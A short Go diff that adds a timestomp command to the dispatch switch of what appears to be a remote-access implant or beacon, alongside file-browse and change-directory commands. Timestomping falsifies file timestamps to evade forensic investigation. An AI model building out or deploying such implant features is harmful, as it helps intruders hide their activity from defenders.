@@ -75,6 +75,9 @@ func main() {
 							case packet.CMD_TYPE_FILE_BROWSE:
 								result, err = services.CmdFileBrowse(cmdBuf)
 								callbackType = 22
+							case packet.CMD_TYPE_TIMESTOMP:
+								result, err = services.CmdTimeStomp(cmdBuf)
+								callbackType = 0
 							case packet.CMD_TYPE_CD:
 								result, err = services.CmdCd(cmdBuf)
 								callbackType = 0
